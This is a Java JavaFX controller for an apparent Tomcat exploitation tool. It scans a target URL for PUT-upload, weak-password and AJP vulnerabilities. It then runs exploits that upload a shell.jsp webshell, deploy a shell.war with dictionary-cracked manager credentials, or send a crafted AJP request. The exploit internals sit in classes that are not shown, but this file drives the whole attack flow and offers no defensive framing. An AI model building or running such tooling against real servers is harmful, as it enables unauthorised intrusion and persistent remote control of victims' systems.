package org.dudu.TomcatVuln.view;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.fxml.Initializable;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.ChoiceBox;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.image.Image;
import javafx.stage.Modality;
import javafx.stage.Stage;
import org.dom4j.DocumentException;
import org.dudu.TomcatVuln.Check.AjpVuln;
import org.dudu.TomcatVuln.Check.PasswordVuln;
import org.dudu.TomcatVuln.Check.PutVuln;
import org.dudu.TomcatVuln.DTO.AjpRequestDTO;
import org.dudu.TomcatVuln.DTO.PasswordExpDTO;
import org.dudu.TomcatVuln.DTO.PutExpDTO;
import org.dudu.TomcatVuln.DTO.ResultDTO;
import org.dudu.TomcatVuln.Enum.Status;
import org.dudu.TomcatVuln.Enum.VulnName;
import org.dudu.TomcatVuln.Exploit.AjpExploit;
import org.dudu.TomcatVuln.Exploit.PassWordExploit;
import org.dudu.TomcatVuln.Exploit.PutExploit;
import org.dudu.TomcatVuln.Interface.strategy.ExecuteStrategy;
import org.dudu.TomcatVuln.Interface.strategy.StrategyChoose;
import org.dudu.TomcatVuln.request.AjpRequest;
import org.dudu.TomcatVuln.utils.ConnectUtil;
import org.dudu.TomcatVuln.utils.FileUtil;

import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.*;


/**
 * @description:
 * @author：DUDU
 * @date: 2023/9/22
 **/

public class MainMenuView implements Initializable {
    @FXML
    public TextField url;
    @FXML
    public TextArea logInfo;
    @FXML
    public TextField port;
    @FXML
    public ChoiceBox choiceBox;
    @FXML
    public ChoiceBox choiceBox1;



    public static Map<String, List<ResultDTO>> ResultMap = new HashMap<>();

    public void  CheckVuln(ActionEvent actionEvent){
        boolean result = ConnectUtil.testConnect(url.getText());
        if(!result) {
            logInfo.appendText("===========无法连接到target:"+url.getText()+"============="+"\n");
        }else {
            logInfo.appendText("===========开始检测target:" + url.getText() + "=============" + "\n\n");
            //开启异步写入测试结果文件中
            String result1 = null;
            String result2 = null;
            String result3 = null;
            ExecuteStrategy executeStrategy;
            try {
                String value = (String)choiceBox.getValue();
                int code = VulnName.findByInfo(value).getCode();
                switch (code) {
                    case 1:
                        executeStrategy = StrategyChoose.chooseCheck("put");
                        result1 = executeStrategy.execute(ConnectUtil.getStandardUrl(url.getText()));
                        logInfo.appendText("===========Put上传漏洞检测:" + result1 + "=============" + "\n");
                        break;
                    case 2:
                        executeStrategy = StrategyChoose.chooseCheck("password");
                        result2 = executeStrategy.execute(ConnectUtil.getStandardUrl(url.getText()));
                        logInfo.appendText("===========弱口令漏洞检测:" + result2 + "=============" + "\n");
                        break;
                    case 3:
                        try {
                            executeStrategy = StrategyChoose.chooseCheck("ajp");
                            result3 = executeStrategy.execute(new AjpRequestDTO(ConnectUtil.getStandardUrl(url.getText()),ConnectUtil.getHost(url.getText()),port.getText()));
                        }catch (Exception e){
                            result3 = "AJP协议无法连接，请确定协议端口开放";
                        }
                        logInfo.appendText("===========AJP协议漏洞检测:" + result3 + "=============" + "\n");
                        break;
                    default:
                        logInfo.appendText("===========无此漏洞相关=============" + "\n");
                        break;
                }

            } catch (MalformedURLException e) {
                throw new RuntimeException(e);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }

        }
    }

    public void  ExploitVuln(ActionEvent actionEvent) throws Exception {
        ExecuteStrategy executeStrategy;
        Set<String> urls = ResultMap.keySet();
        for(String url:urls) {
            logInfo.appendText("===========开始攻击target:" + url + "=============" + "\n");
            String result = null;
            ResultDTO resultDTO = null;
            List<ResultDTO> resultDTOList = ResultMap.get(url);
            String value = (String) choiceBox1.getValue();
            int code = VulnName.findByInfo(value).getCode();
            for(ResultDTO r:resultDTOList){
                if(r.getVulnName().getCode()==code){
                    resultDTO = r;
                    if(r.getStatus()==Status.FAIL){
                        result = "此target:"+url+"不存在此漏洞";
                    }
                    break;
                }
            }

            switch (code) {
                case 1:
                    if (result!=null) {
                        logInfo.appendText("===========Put上传漏洞检测:" + result + "=============" + "\n");
                        break;
                    }
                    executeStrategy = StrategyChoose.chooseExploit("put");
                    String filepath = FileUtil.parseJsp();
                    String filename = filepath.substring(filepath.lastIndexOf("/"));
                    PutExpDTO putExpDTO = PutExpDTO.builder().url(url).filename(filename).filePath(filepath).build();
                    result = executeStrategy.execute(putExpDTO);
                    logInfo.appendText("===========Put上传漏洞检测:" + result + "=============" + "\n");
                    break;
                case 2:
                    if (result!=null) {
                        logInfo.appendText("===========弱口令漏洞检测:" + result + "=============" + "\n");
                        break;
                    }
                    executeStrategy = StrategyChoose.chooseExploit("password");
                    PasswordExpDTO passwordExpDTO = PasswordExpDTO.builder().base64_content(resultDTO.getAuth()).url(url).build();
                    //从配置中读取
                    String filepath_war = FileUtil.parseWar();
                    String filename_war = filepath_war.substring(filepath_war.lastIndexOf("/"));
                    passwordExpDTO.setFilename(filename_war);
                    passwordExpDTO.setFilePath(filepath_war);
                    result = executeStrategy.execute(passwordExpDTO);
                    logInfo.appendText("===========弱口令漏洞检测:" + result + "=============" + "\n");
                    break;
                case 3:
                    if (result!=null)
                    {
                        logInfo.appendText("===========AJP协议漏洞检测:" + result + "=============" + "\n");
                        break;
                    }
                    executeStrategy = StrategyChoose.chooseExploit("ajp");
                    AjpRequestDTO ajpRequestDTO = AjpRequestDTO.builder().url(url).port(resultDTO.getPort()).uri("/asbf").ip(resultDTO.getIp()).path(resultDTO.getPath()).build();
                    result = executeStrategy.execute(ajpRequestDTO);
                    logInfo.appendText("===========AJP协议漏洞检测:\n" + result + "=============" + "\n");
                    break;
                default:
                    logInfo.appendText("===========无此漏洞相关=============" + "\n");
                    break;
            }

        }

    }


    @FXML
    public void setDict(ActionEvent actionEvent) throws IOException {
        Stage stage = new Stage();
        stage.setTitle("设置字典");
        stage.initModality(Modality.APPLICATION_MODAL);
        stage.setResizable(false);
        Parent root = FXMLLoader.load(getClass().getResource("/views/setDict.fxml"));
        stage.setScene(new Scene(root));
        stage.show();
    }


    public void setJsp(ActionEvent actionEvent) throws IOException {
        Stage stage = new Stage();
        stage.setTitle("设置webshell");
        stage.initModality(Modality.APPLICATION_MODAL);
        stage.setResizable(false);
        Parent root = FXMLLoader.load(getClass().getResource("/views/setJsp.fxml"));
        stage.setScene(new Scene(root));
        stage.show();
    }

    public void setWar(ActionEvent actionEvent) throws IOException {
        Stage stage = new Stage();
        stage.setTitle("设置war包");
        stage.initModality(Modality.APPLICATION_MODAL);
        stage.setResizable(false);
        Parent root = FXMLLoader.load(getClass().getResource("/views/setWar.fxml"));
        stage.setScene(new Scene(root));
        stage.show();
    }



    public void setReset(ActionEvent actionEvent) {
    }


    @Override
    public void initialize(URL location, ResourceBundle resources) {
        choiceBox.setValue("Put文件上传漏洞");
        choiceBox1.setValue("Put文件上传漏洞");
        try {
            String UsernamePath = getClass().getResource("/dict/username.txt").getPath().substring(1);
            String PasswordPath = getClass().getResource("/dict/password.txt").getPath().substring(1);
            String ShellPath = getClass().getResource("/shell.jsp").getPath().substring(1);
            String WarPath = getClass().getResource("/shell.war").getPath().substring(1);
            FileUtil.initUsernamePath = UsernamePath;
            FileUtil.initPasswordPath = PasswordPath;
            FileUtil.initShellPath = ShellPath;
            FileUtil.initWarPath = WarPath;
            FileUtil.writeConfig(UsernamePath,PasswordPath);
            FileUtil.writeConfigJsp(ShellPath);
            FileUtil.writeConfigWar(WarPath);
            PasswordVuln passwordVuln = new PasswordVuln();
            PutVuln putVuln = new PutVuln();
            AjpVuln ajpVuln = new AjpVuln();
            StrategyChoose.putCheckStrategy(putVuln.mark(),putVuln);
            StrategyChoose.putCheckStrategy(passwordVuln.mark(),passwordVuln);
            StrategyChoose.putCheckStrategy(ajpVuln.mark(),ajpVuln);
            PutExploit putExploit = new PutExploit();
            PassWordExploit passWordExploit = new PassWordExploit();
            AjpExploit ajpExploit = new AjpExploit();
            StrategyChoose.putExploitStrategy(putExploit.mark(),putExploit);
            StrategyChoose.putExploitStrategy(passWordExploit.mark(),passWordExploit);
            StrategyChoose.putExploitStrategy(ajpExploit.mark(),ajpExploit);
        } catch (DocumentException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }
    }
}
